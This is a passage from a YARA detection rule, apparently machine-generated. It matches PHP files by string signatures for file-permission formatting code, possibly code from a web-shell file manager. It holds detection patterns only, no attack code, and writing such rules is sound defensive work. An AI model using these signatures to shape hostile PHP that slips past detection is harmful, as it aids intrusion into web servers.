      $s6 = "$info .= (($perms & 0x0010) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s7 = "$info .= (($perms & 0x0040) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s8 = "$info .= (($perms & 0x0008) ?" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s9 = "$info .= (($perms & 0x0002) ? 'w' : '-');" fullword ascii /* score: '4.00'*/ /* Goodware String - occured 1 times */
      $s10 = "if ($fp)" fullword ascii /* score: '2.00'*/ /* Goodware String - occured 3 times */
   condition:
      ( uint16(0) == 0x3f3c and filesize < 300KB and ( all of them )
      ) or ( all of them )
}

